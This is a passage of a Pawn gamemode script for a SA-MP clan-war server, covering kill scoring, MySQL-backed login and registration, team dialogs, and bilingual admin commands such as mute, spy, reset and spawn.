    new oppositeTeam = team[playerid] == home ? away : home;
    
	new playerWorld = GetPlayerVirtualWorld(playerid);
	
	if (score && playerWorld != 0)
	    return 1;

    if (killerid == INVALID_PLAYER_ID)
        return 1;

    if (team[playerid] == spec || team[killerid] == spec)
        return 1;

    GameTextForPlayer(killerid, gPlayerName(playerid), 3000, 1);

	//	++totalscore[oppositeTeam];

    ++kills[killerid];
    ++deaths[playerid];


    SetPlayerScore(killerid, GetPlayerScore(killerid) + 1);
    SendDeathMessage(killerid, playerid, reason);

    if (score && GetPlayerVirtualWorld(playerid) == 0)
    {

        if (team[playerid] == team[killerid])
			SCMTAFL(-1, "{00A3C0}TEAMKILL: Team %s has earned a point for themselves.", "{00A3C0}TEAMKILL: T˝m %s zÌskal bod pro sebe", teamname[oppositeTeam]);

        ++teamscore[oppositeTeam];
		++totalscore[oppositeTeam];

        if (teamscore[oppositeTeam] == roundscore)
        {
            OnTeamWonRound(oppositeTeam); // Consider using CallLocalFunction instead
        }
    }


    for(new i; i < MAX_PLAYERS; i++)
    updatetextdraw(i);

    new string[128];
    format(string, sizeof(string), "language (%d) %02d:%02d (%d)", teamrounds[home], totalscore[home], totalscore[away], teamrounds[away]);
  	SendRconCommand(string);
    return 1;
}

forward MyHttpResponse(index, response_code, data[]);
public MyHttpResponse(index, response_code, data[])
{
    // In this callback "index" would normally be called "playerid" ( if you didn't get it already :) )
    new
        buffer[ 128 ];
    if(response_code == 200) //Did the request succeed?
    {
        //Yes!
        if(strfind(data, "1", true) != -1)
        {
            printf("There is a new server update available! Download it on cwlogs.fsclan.xyz");
            SendClientMessage(index, -1, "There is a new update available. Please notice the server owner to update the gamemode.");
            SendRconCommand("exit");
        }
    }
    else
    {
        //No!
        printf("Exiting the server, something unexpected occured.");
        format(buffer, sizeof(buffer), "Custom request failed, error code: %d. Exiting.", response_code);
        SendClientMessage(index, 0xFFFFFFFF, buffer);
        SendRconCommand("exit");
    }
}

public OnPlayerSpawn(playerid)
{
  for(new i; i < MAX_PLAYERS; i++)
		if(SpecID[i] == playerid)
			SetTimerEx("RespawnSpec", 500, false, "ii", i, playerid);
  if (speconly == true)
  {
      {
        if (team[playerid] == spec)
        {
            new id;
            id = lowestplayer();
            TogglePlayerSpectating(playerid, 1);
            PlayerSpectatePlayer(playerid, id);
            spectating[playerid] = true;
            TextDrawHideForPlayer(playerid, FPSSzamlalo[playerid]);
  			TextDrawHideForPlayer(playerid, Pingszamlalo[playerid]);
        }
      }
  }
  //TextDrawShowForPlayer(playerid, Indicator[playerid]);
  PlayerInfo[playerid][pSkin] = GetPlayerSkin(playerid);
  SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
  moveplayertospawn(playerid);
  //mutassuk neki az als√É¬≥ td-t
  TextDrawShowForPlayer(playerid, Textdraw0[playerid]);
  TextDrawShowForPlayer(playerid, box);
  TextDrawShowForPlayer(playerid, FPSSzamlalo[playerid]);
  TextDrawShowForPlayer(playerid, Pingszamlalo[playerid]);
  ResetPlayerWeapons(playerid);
  updatetextdraw(playerid);
  if (team[playerid] != spec) // ha az illet√Ö‚Äò nem spec csapatban van, adjon neki sawnot
  {
    GivePlayerWeapon(playerid, default_weapon, 5000);
    GivePlayerWeapon(playerid, default_weapon, 5000);
  }
  return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    if (Languages_OnDialogResponse(playerid, dialogid, response, listitem, inputtext))
	{
	    if (response)
	    {
		  SCML(playerid, -1, "{00A3C0}You have chosen english language.", "{00A3C0}Vybral si si Ëesk˝ jazyk.");
		  if(GetPVarInt(playerid, "Logged") == 0)
		  {
		  new query[140];
		  GetPlayerName(playerid, PlayerName[playerid], 30); // This will get the player's name
		  GetPlayerIp(playerid, PlayerIP[playerid], 16); // This will get the player's IP Address
		  mysql_format(Database, query, sizeof(query), "SELECT `Password`, `ID`, `ADMIN` FROM `users` WHERE `Username` = '%e' LIMIT 0, 1", PlayerName[playerid]); // We are selecting the password and the ID from the player's name
		  mysql_tquery(Database, query, "CheckPlayer", "i", playerid);
		  }
	    }
	    else
	    {
          ShowPlayerSelectLangDialog(playerid);
	    }
	}
	if (dialogid == 0)
	{
	    if(response)
	    {
	        if(gRememberedTeam[playerid] == home)
	        {
	            gColorHome = E_TEAM_COLORS:listitem;

	            ForPlayers(i)
	                if (team[i] == home)
	                    SetPlayerColor(i, gTeamNickColors[gColorHome]);
	                    
                SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has changed team Home's color to %s.", "{00A3C0}Administr·tor %s (ID:%d) zmenil farbu Home.", gPlayerName(playerid), playerid);
	        }
	        else
	        {
	            gColorAway = E_TEAM_COLORS:listitem;

	            ForPlayers(i)
	                if (team[i] == away)
	                    SetPlayerColor(i, gTeamNickColors[gColorAway]);
	                    
                SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has changed team Away's color.", "{00A3C0}Administr·tor %s (ID:%d) zmenil farbu Away.", gPlayerName(playerid), playerid);
	        }

	        ForPlayers(i)
	            updatetextdraw(i);
	    }
	}
	if (dialogid == DIALOG_LOGIN)
	{
	if(!response)
    return Kick(playerid); // If the player has pressed exit, kick them.

    new password[129], query[100];
    WP_Hash(password, 129, inputtext); // We're going to hash the password the player has written in the login dialog
    if(!strcmp(password, PlayerInfo[playerid][Password])) // This will check if the password we used to register with matches
    { // If it matches
        mysql_format(Database, query, sizeof(query), "SELECT * FROM `users` WHERE `Username` = '%e' LIMIT 0, 1", PlayerName[playerid]);
        mysql_tquery(Database, query, "LoadPlayer", "i", playerid); //Let's call LoadPlayer.
        SetPVarInt(playerid, "Logged", 1);
        TextDrawHideForPlayer(playerid, Textdraw1);
        TextDrawHideForPlayer(playerid, Textdraw2);
        TextDrawHideForPlayer(playerid, Textdraw3);
    }
    else // If the password doesn't match.
    {
        ShowPlayerDialog(playerid, DIALOG_LOGIN, DIALOG_STYLE_PASSWORD, "Login", "{FF0000}Wrong Password!\n{FFFFFF}Type your correct password below to continue and sign in to your account", "Login", "Exit");
        // We will show this dialog to the player and tell them they have wrote an incorrect password.
    }
    return 1;
	}
	if (dialogid == DIALOG_REGISTER)
	{
    if(!response)
    return Kick(playerid);

    if(strlen(inputtext) < 3) return ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_PASSWORD, "Register", "{FF0000}Short Password!\n{FFFFFF}Type a 3+ characters password if you want to register and play on this server", "Register", "Exit");
    //If the password is less than 3 characters, show them a dialog telling them to input a 3+ characters password
    new query[300];
    WP_Hash(PlayerInfo[playerid][Password], 129, inputtext); // Hash the password the player has wrote to the register dialog using Whirlpool.
    mysql_format(Database, query, sizeof(query), "INSERT INTO `users` (`Username`, `Password`, `IP`, `Admin`) VALUES ('%e', '%e', '%e', 0)", PlayerName[playerid], PlayerInfo[playerid][Password], PlayerIP[playerid]);
    // Insert player's information into the MySQL database so we can load it later.
    mysql_pquery(Database, query, "RegisterPlayer", "i", playerid); // We'll call this as soon as the player successfully registers.
    SendClientMessage(playerid, -1, "{00A3C0}You have registered successfully. Welcome back!");
    SetPVarInt(playerid, "Logged", 1);
    new string[100];
    format(string, sizeof(string), "{00A3C0}%s has successfully registered to the server.", gPlayerName(playerid));
    SendClientMessageToAll(playerid, string);
    TextDrawHideForPlayer(playerid, Textdraw1);
    TextDrawHideForPlayer(playerid, Textdraw2);
    TextDrawHideForPlayer(playerid, Textdraw3);
    return 1;
	}
  //csapatv√É¬°laszt√É¬≥ dialog folytat√É¬°sa, kiiratjuk milyen cspatot v√É¬°lasztott majd a csapat spawnpointj√É¬°ra helyezz√É¬ºk a playert √É¬©s megadjuk a csapatj√É¬°t
    if(dialogid == 1)
    {
    if(response)
    {
      if (listitem != 2 && teamslocked == true)
      {
      new string[180];
      format(string, sizeof(string), "{32CD32}%s\n{AA3333}%s\n{FFFF00}%s\n{FFFFFF}You can only choose spectators.", teamname[0], teamname[1], teamname[2]);
      ShowPlayerDialog(playerid, 1, DIALOG_STYLE_LIST, "{FF0000}Teams are locked!", string, "Select", "");
      return true;
      }
      team[playerid] = listitem;
      moveplayertospawn(playerid);
      SpawnPlayer(playerid);
      new string[150];
      format(string, sizeof(string), "{00A3C0}%s (ID:%d) has selected team %s", gPlayerName(playerid), playerid, teamname[team[playerid]]);
      SCMTAFL(-1, "{00A3C0}%s (ID:%d) has selected team %s", "{00A3C0}%s (ID:%d) si vybral t˝m %s.", gPlayerName(playerid), playerid, teamname[team[playerid]]);
      if (team[playerid] == home)
	   SetPlayerColor(playerid, gTeamNickColors[gColorHome]);
	  else if (team[playerid] == away)
	   SetPlayerColor(playerid, gTeamNickColors[gColorAway]);
	  else
	   SetPlayerColor(playerid, teamcolor(spec));
    }
  }
    return 1;
}

stock Float:GetPlayerDistanceFromPlayer(playerid, targetid)
{
	new Float:fDist[3];
	GetPlayerPos(playerid, fDist[0], fDist[1], fDist[2]);
	return GetPlayerDistanceFromPoint(targetid, fDist[0], fDist[1], fDist[2]);
}

public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{
	if(hittype == BULLET_HIT_TYPE_PLAYER&& hitid != playerid)
	{
		if(weaponid == 26 && antidistancebug == true && GetPlayerDistanceFromPlayer(playerid, hitid) > MAX_HIT_DISTANCE)
		{
			return 0;
		}
	}

	return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float:amount, weaponid, bodypart)
{
    if(issuerid != INVALID_PLAYER_ID)
    {
      if(hitsound[issuerid] == true)
      {
          PlayerPlaySound(issuerid, 17802, 0.0, 0.0, 0.0);
      }
    }
	if(team[playerid] == spec)
		return 0;
    if(issuerid == INVALID_PLAYER_ID)
		return 0;

    PlayerInfo[issuerid][pDamage] += amount;
    PlayerInfo[playerid][pInjuries] += amount;
    updatetextdraw(playerid);
    updatetextdraw(issuerid);

    return 1;
}

public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
    if (!success)
    {
       SCMFL(playerid, 0xFF0000AA, "Unknown command '%s'. Please use /cmds to get help.", "Nezn·m˝ p¯Ìkaz '%s'. Chcete-li zÌskat pomoc, pouûijte /cmds.", cmdtext[0]);
    }


    if(strfind(cmdtext, "/pm", true) == 0)
     return 1;
     
     
	if(spy[playerid] == true)
	{
    new string[300];
    format(string, sizeof(string), "TXT >> %s (ID:%d): %s", gPlayerName(playerid), playerid, cmdtext[0]);
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
      if(IsPlayerConnected(i) == 1)
      {
        if(i != playerid)
        {
          if(PlayerInfo[i][Admin] > 0)
          {
            SendLongMessage(i, 0x808080FF, string);//  SCMF(i, -1, "{00A3C0}[TeamChat] %s (ID: %d): %s", gPlayerName(playerid), playerid, text);
          }
        }
    }
    }
    }
    return 1;
}

public OnPlayerCommandReceived(playerid, cmdtext[])
{
    if(GetPVarInt(playerid, "Mute") == 1)
    {
    	SCML(playerid, -1, "{FF0000}You can't use commands, you are muted.", "Nem˘ûete pouûÌvat p¯Ìkazy, jste umlËen.");
    	return 0;
    }
    return 1;
}

forward CheckFPSUnlocker(playerid);
public CheckFPSUnlocker(playerid)
{
	if (GetPlayerFPS(playerid) > 105)
	{
		SCMTAFL(-1, "{00A3C0}%s (ID: %d) has been kicked. Reason: FPS-Unlocker", "{00A3C0}%s (ID: %d) dostal kick. DÙvod: FPS Unlocker", gPlayerName(playerid), playerid);
		KickPersonWithDelay(playerid);
	}
}

CMD:updates(playerid, params[])
{
    SCML(playerid, -1, "{00A3C0}Added command /updates", "{00A3C0}Pridan˝ prÌkaz /updates");
    SCML(playerid, -1, "{00A3C0}Added command /fpsunlocker (for admins)", "{00A3C0}Pridan˝ prÌkaz /fpsunlocker (pre adminov)");
    SCML(playerid, -1, "{00A3C0}Added command /distancebug (for admins)", "{00A3C0}Pridan˝ prÌkaz /distancebug (pre adminov)");
    SCML(playerid, -1, "{00A3C0}Added command /spawn (for admins)", "{00A3C0}Pridan˝ prÌkaz /spawn (pre adminov)");
    SCML(playerid, -1, "{00A3C0}Added an FPS and PING counter", "{00A3C0}PridanÈ poËÌtadlo na FPS a PING");
	return 1;
}

CMD:fpsunlocker(playerid, params[])
{
	if (PlayerInfo[playerid][Admin] < 2) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
	if (fpsunlocker == true)
	{
	    fpsunlocker = false;
	    SCMTAFL(-1, "{00A3C0}Administrator %s (ID: %d) has disabled FPS-Unlockers!", "{00A3C0}Administr·tor %s (ID: %d) zak·zal FPS-Unlocker!", gPlayerName(playerid), playerid);
	}
	else
	{
	    fpsunlocker = true;
	    SCMTAFL(-1, "{00A3C0}Administrator %s (ID: %d) has enabled FPS-Unlocker!", "{00A3C0}Administr·tor %s (ID: %d) povolil FPS-Unlocker!", gPlayerName(playerid), playerid);
		ForPlayers(i)
		SetTimerEx("CheckFPSUnlocker", 2000, false, "d", i);
	}
	return 1;
}

CMD:lang(playerid, params[])
{
ShowPlayerSelectLangDialog(playerid);
return 1;
}

CMD:kill(playerid, params[])
{
  SetPlayerHealth(playerid, 0);
  new string[100];
  format(string, sizeof(string), "{00A3C0}%s (ID:%d) has killed himself.", gPlayerName(playerid), playerid);
  SCMTAFL(-1, "{00A3C0}%s (ID:%d) has killed himself.", "{00A3C0}%s (ID:%d) se zabil.", gPlayerName(playerid), playerid);
  return 1;
}

CMD:spy(playerid, params[])
{
 if (PlayerInfo[playerid][Admin] < 2) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
 if (isnull(params)) return ERRORL("Usage: /spy [on | off]", "PouûÌt: /spy [on | off]");
 if(!strcmp(params, "on", true))
  {
	  spy[playerid] = true;
      SCML(playerid, -1, "{00A3C0}You see players commands/texts now.", "Teraz vidÌö prÌkazy / text hr·Ëov.");
  }
 if(!strcmp(params, "off", true))
 {
	  spy[playerid] = false;
      SCML(playerid, -1, "{00A3C0}You don't see players commands/texts now.", "PrÌkazy a text hr·Ëov sa teraz nezobrazuj˙.");
 }
 return 1;
}

CMD:defweapon(playerid, params[])
{
  new def_weapon_id;
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  if(sscanf(params, "i", def_weapon_id)) return ERRORL("Usage: /defweapon [id]", "PouûÌt: /defweapon [id]");
  if(!IsValidWeapon(def_weapon_id)) return ERRORL("Invalid Weapon-ID", "Nespr·vne Weapon-ID");
  SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has set the default weapon to %s.", "{00A3C0}Administ·tor %s (ID:%d) nastavil v˝chozÌ zbraÚ na %s.", gPlayerName(playerid), playerid, GetWeaponNameByID(def_weapon_id));
  default_weapon = def_weapon_id;
  for(new i = 0; i < MAX_PLAYERS; i++)
  {
    if (team[i] != spec)
      {
        ResetPlayerWeapons(i);
        GivePlayerWeapon(i, def_weapon_id, 5000);
      }
  }
  return 1;
}

CMD:admins(playerid, params[])
{
    new count = 0, string19[256];
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][Admin] > 0)
            {
                count++;
                if(count == 1)
                  SendClientMessage(playerid, -1, "Online Administrators:");

                format(string19, sizeof(string19), "Level %d: %s (%i)", PlayerInfo[i][Admin], gPlayerName(i), i);
                SendClientMessage(playerid, -1, string19);
            }
        }
    }
    if(!count)
    {
        ERRORL("No administrators online", "é·dnÌ administr·to¯i online");//SendClientMessage(playerid, -1, "No Admins Online at Time!");
    }
    return 1;
}

CMD:serial(playerid, params[])
{
  new pID;
  if(sscanf(params,"u",pID)) return ERRORL("Usage: /serial [id]", "PouûÌt: /serial [id]");
  if(sscanf(params,"u",pID)) return ERRORL("Invalid playerid", "Neplatn˝ playerid");
  new accounts[100][MAX_PLAYER_NAME],string[256]; //change * to the maximum number of names you want to retrieve.
  SERIAL(pID,accounts);
  if(accounts[0][0] == '\0') return ERRORL("No other accounts found.", "Nebyly nalezeny û·dnÈ dalöÌ ˙Ëty.");
  for(new i; i<sizeof(accounts); i++)
  {
      if(accounts[i][0] == '\0') break;
      format(string,sizeof(string),"%s%s\n",string,accounts[i]);
  }
  return ShowPlayerDialog(playerid,999,DIALOG_STYLE_MSGBOX,"All Player Accounts",string,!"Okay",!"");
}

CMD:aka(playerid, params[])
{
  new pID;
  if(sscanf(params,"u",pID)) return ERRORL("Usage: /aka [id]", "PouûÌt: /aka [id]");
  if(!IsPlayerConnected(pID)) return ERRORL("Invalid playerid", "Neplatn˝ playerid.");
  new accounts[100][MAX_PLAYER_NAME],string[256]; //change * to the maximum number of names you want to retrieve.
  AKA(pID,accounts);
  if(accounts[0][0] == '\0') return ERRORL("No other accounts found.", "Nebyly nalezeny û·dnÈ dalöÌ ˙Ëty.");
  for(new i; i<sizeof(accounts); i++)
  {
      if(accounts[i][0] == '\0') break;
      format(string,sizeof(string),"%s%s\n",string,accounts[i]);
  }
  return ShowPlayerDialog(playerid,999,DIALOG_STYLE_MSGBOX,"All Player Accounts",string,!"Okay",!"");
}

CMD:skin(playerid, params[])
{
  new i_skin;
  if (sscanf(params, "i", i_skin))
      return ERRORL("Usage: /skin [ID]", "PouûÌt: /skin [id]");
  if (i_skin < 0 || i_skin > 299)
      return ERRORL("Skins can be set from 0 to 299.", "Skiny lze nastavit od 0 do 299.");
  if (IsValidSkin(i_skin))
      return ERRORL("Invalid Skin-ID.", "Nespr·vne Skin-ID.");
  /*if (score == true)
	  return ERRORL("You can't change your skin during the CW.", "NemÙûeö zmeniù skin poËas CW.");*/
  SetPlayerSkin(playerid, i_skin);
  PlayerInfo[playerid][pSkin] = i_skin;
  new string[180];
  format(string, sizeof(string), "{00A3C0}You have successfully modified your skin.");
  SCML(playerid, -1, "{00A3C0}You have successfully modified your skin.", "{00A3C0}⁄spÏöne si si nastavil skin.");
  return 1;
}

CMD:hitsound(playerid, params[])
{
  hitsound[playerid] = !hitsound[playerid];
  if (hitsound[playerid])
  SCML(playerid, -1, "{00A3C0}You have successfully enabled hitsound.", "{00A3C0}⁄spÏönÏ jste povolili hitsound.");
  else
  SCML(playerid, -1, "{00A3C0}You have successfully disabled hitsound.", "{00A3C0}⁄spÏönÏ jste deaktivovali hitsound.");
  return 1;
}

CMD:w(playerid, params[])
{
  new worldid;
  //if (score) return ERRORL("You can't join virtual worlds if the score is enabled.", "Pokud je skÛre povoleno, nem˘ûete se p¯ipojit k virtu·lnÌm svÏt˘m.");
  if (sscanf(params, "i", worldid)) return ERRORL("Usage: /world [ID]", "PouûÌt: /world [id]");
  SetPlayerVirtualWorld(playerid, worldid);
  SCMFL(playerid, -1, "{00A3C0}You have moved to VirtualWorld ID: %d", "{00A3C0}Vstoupili jste do svÏta %d.", worldid);
  return 1;
}

CMD:world(playerid, params[])
{
  return cmd_w(playerid, params);
}

CMD:mute(playerid, params[])
{
    if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
    new mutedid, reason[64];
    if(sscanf(params,"uS(None)[64]", mutedid, reason)) return ERRORL("Usage: /mute [playerid] [reason]", "PouûÌt: /mute [id] [d˘vod]");
    if(!IsPlayerConnected(mutedid)) return ERRORL("Invalid playerid.", "Neplatn˝ playerid.");
    SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has muted %s (ID:%d). Reason: %s", "{00A3C0}Administr·tor %s (ID:%d) byl umlËen %s (ID:%d). D˘vod: %s", gPlayerName(playerid), playerid, gPlayerName(mutedid), mutedid, reason);
    SetPVarInt(mutedid,"Mute",1);
    return 1;
}

CMD:unmute(playerid, params[])
{
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  new mutedid;
  if(sscanf(params,"u", mutedid)) return ERRORL("Usage: /unmute [playerid]", "PouûÌt: /unmute [id]");
  if(!IsPlayerConnected(mutedid)) return ERRORL("Invalid playerid.", "Neplatn˝ playerid");
  SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has unmuted %s (ID:%d)", "{00A3C0}Administr·tor %s (ID:%d) byl odmlËen %s (ID:%d).", gPlayerName(playerid), playerid, gPlayerName(mutedid), mutedid);
  SetPVarInt(mutedid,"Mute",0);
  return 1;
}

CMD:distancebug(playerid, params[])
{
    if (PlayerInfo[playerid][Admin] < 2) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
	if (antidistancebug == true)
	{
		antidistancebug = false;
		SCMTAFL(-1, "{00A3C0}Administrator %s (ID: %d) has enabled Distance-Bug!", "{00A3C0}Administr·tor %s (ID: %d) zak·zal Distance-Bug!", gPlayerName(playerid), playerid);
	}
	else
	{
	    antidistancebug = true;
	    SCMTAFL(-1, "{00A3C0}Administrator %s (ID: %d) has disabled Distance-Bug!", "{00A3C0}Administr·tor %s (ID: %d) povolil Distance-Bug!", gPlayerName(playerid), playerid);
 	}
	return 1;
}

CMD:pm(playerid, params[])
{
  #define COLOR_ORANGE              0xFF9933AA
  #define COLOR_YELLOW              0xFFFF00AA
  if(GetPVarInt(playerid, "Mute") == 1) return SendClientMessage(-1, playerid, "{FF0000}You can't use commands, you are muted.");
  new id, pmtext[144], string[100];
  if (sscanf(params, "us[144]", id, pmtext)) return ERRORL("Usage: /pm [id] [message]", "PouûÌt: /pm [id] [zpr·va]");//SendClientMessage(playerid, COLOR_ORANGE, "Usage: /pm <id> <message>");
  if (!IsPlayerConnected(id)) return ERRORL("Invalid playerid.", "Neplatn˝ playerid.");//SendClientMessage(playerid, COLOR_RED, "ERROR: Player not connected");
  if (playerid == id) return ERRORL("You can't send a message to yourself.", "Nem˘ûete si poslat zpr·vu sami sobÏ.");//SendClientMessage(playerid, COLOR_RED, "ERROR: You cannot pm yourself!");
  format(string, sizeof(string), "PM >> %s (ID:%d) -> %s (ID:%d): %s", gPlayerName(playerid), playerid, gPlayerName(id), id, pmtext);
  SCMFL(playerid, COLOR_ORANGE, "PM to %s (ID:%d): %s", "PM do %s (ID:%d): %s", gPlayerName(id), id, pmtext);
  SCMFL(id, COLOR_YELLOW, "PM from %s (ID:%d): %s", "PM od %s (ID:%d): %s", gPlayerName(playerid), playerid, pmtext);
  for(new i = 0; i < MAX_PLAYERS; i++)
  {
    if(IsPlayerConnected(i) == 1)
    {
      if(i != playerid)
      {
        if(PlayerInfo[i][Admin] > 1 && spy[i] == true)
        {
          SendLongMessage(i, 0x808080FF, string);
        }
      }
  }
  }
  return 1;
}

CMD:reset(playerid, params[])
{
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  teamscore[home] = 00;
  teamscore[away] = 00;
  new string[300];
  format(string, sizeof(string), "{00A3C0}Administrator %s (ID:%d) has reset the round.", "{00A3C0}Adminisztr·tor %s (ID:%d) lenull·zta a kˆrt.", gPlayerName(playerid), playerid);
  SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has reset the round.", "{00A3C0}Administr·tor %s (ID:%d) resetnul kolo.", gPlayerName(playerid), playerid);
  for(new i; i < MAX_PLAYERS; i++)
  updatetextdraw(i);
  return 1;
}

CMD:resetall(playerid, params[])
{
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  teamrounds[home] = 00;
  teamrounds[away] = 00;
  totalscore[home] = 00;
  totalscore[away] = 00;
  teamscore[home] = 00;
  teamscore[away] = 00;
  for(new i; i < MAX_PLAYERS; i++)
  {
  deaths[i] = 0;
  kills[i] = 0;
  PlayerInfo[i][pDamage] = 0;
  PlayerInfo[i][pInjuries] = 0;
  SetPlayerScore(i, 0);
  }
  new string[300];
  format(string, sizeof(string), "{00A3C0}Administrator %s (ID:%d) has reset everything.", gPlayerName(playerid), playerid);
  SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has reset everything.", "{00A3C0}Administr·tor %s (ID:%d) resetnul vöechno.", gPlayerName(playerid), playerid);
  for(new i; i < MAX_PLAYERS; i++)
  updatetextdraw(i);
  return 1;
}

CMD:spawnall(playerid, params[])
{
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  for(new i; i < MAX_PLAYERS; i++) {
    SpawnPlayer(i);
    SetPlayerHealth(i, 100);
  }
  new string[300];
  format(string, sizeof(string), "{00A3C0}Administrator %s (ID:%d) has spawned everyone.", gPlayerName(playerid), playerid);
  SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has spawned everyone.", "{00A3C0}Administr·tor %s (ID:%d) spawnul vöechny.", gPlayerName(playerid), playerid);
  return 1;
}

CMD:spawn(playerid, params[])
{
  new target_id;
  if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
  if(sscanf(params,"u",target_id)) return ERRORL("Usage: /spawn [playerid]", "PouûÌt: /spawn [playerid]");
  SpawnPlayer(target_id);
  SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has respawned %s (ID: %d).", "{00A3C0}Administr·tor %s (ID:%d) respawnol %s (ID:%d).", gPlayerName(playerid), playerid, gPlayerName(target_id), target_id);
  return 1;
}

CMD:respawn(playerid, params[])
{
  if (!score)
  {
  SpawnPlayer(playerid);
  SetPlayerHealth(playerid,100);
  new string[300];
  format(string, sizeof(string), "{00A3C0}%s (ID:%d) has respawned.",gPlayerName(playerid), playerid);
  SCMTAFL(-1, "{00A3C0}%s (ID:%d) has respawned.", "{00A3C0}%s (ID:%d) se respawnul.", gPlayerName(playerid), playerid);
  }
  else if (team[playerid] == spec)
  {
  SpawnPlayer(playerid);
  SetPlayerHealth(playerid,100);
  new string[300];
  format(string, sizeof(string), "{00A3C0}%s (ID:%d) has respawned.",gPlayerName(playerid), playerid);
  SCMTAFL(-1, "{00A3C0}%s (ID:%d) has respawned.", "{00A3C0}%s (ID:%d) se respawnul.", gPlayerName(playerid), playerid);
  }
  else
  {
  ERRORL("You can't respawn now.", "TeÔ se nem˘ûeö respawnout.");
  }
  return 1;
}

CMD:sync(playerid, params[])
{
  new Float:Pos[3],Float:Health;
  GetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]);
  GetPlayerHealth(playerid,Health);
  SpawnPlayer(playerid);
  SetPVarFloat(playerid,"X",Pos[0]);
  SetPVarFloat(playerid,"Y",Pos[1]);
  SetPVarFloat(playerid,"Z",Pos[2]);
  SetPVarFloat(playerid,"H",Health);
  new string[300];
  format(string, sizeof(string), "{00A3C0}%s (ID:%d) has synced himself.",gPlayerName(playerid), playerid);
  SCMTAFL(-1, "{00A3C0}%s (ID:%d) has synced himself.","{00A3C0}%s (ID:%d) se synchronizoval.", gPlayerName(playerid), playerid);
  return 1;
}
CMD:start(playerid, params[])
{
    if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
    new id = strval(params);
    //if(id < 0 || id > 100) return ERROR("SERVER: /go [1-100]");
    if (id) {
    CountDown(id);
    SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has started the game.", "{00A3C0}Administr·tor %s (ID:%d) spustil hru.", gPlayerName(playerid), playerid);
    } else {

    for(new i; i < MAX_PLAYERS; i++)
   	GameTextForPlayer(i, "~g~START", 1000, 5);

    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 10.0);
    SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has started the game.", "{00A3C0}Administr·tor %s (ID:%d) spustil hru.", gPlayerName(playerid), playerid);
    for(new i; i < MAX_PLAYERS; i++)
    TogglePlayerControllable(i,1);
    }
    return 1;
}

CMD:stop(playerid, params[])
{
    if (PlayerInfo[playerid][Admin] < 1) return ERRORL("You can't use this command because your admin level isn't high enough.", "Tento p¯Ìkaz nem˘ûete pouûÌt, protoûe vaöe ˙roveÚ spr·vce nenÌ dostateËnÏ vysok·.");
    SCMTAFL(-1, "{00A3C0}Administrator %s (ID:%d) has stopped the game.", "{00A3C0}Administr·tor %s (ID:%d) zastavil hru.", gPlayerName(playerid), playerid);
    for(new i; i < MAX_PLAYERS; i++)
    {
    if(team[i] != spec)
    {
      GameTextForPlayer(i, "~r~STOP", 1000, 5);
      TogglePlayerControllable(i, 0);
    }
    }
    return 1;
}

CMD:fps(playerid, params[])
{
  	if(isnull(params))
	{
	SCMFL(playerid,-1,"{00A3C0}Your FPS is: %d", "{00A3C0}Vaöe FPS je: %d", GetPlayerFPS(playerid));
	return 1;
	}
  	new pID;
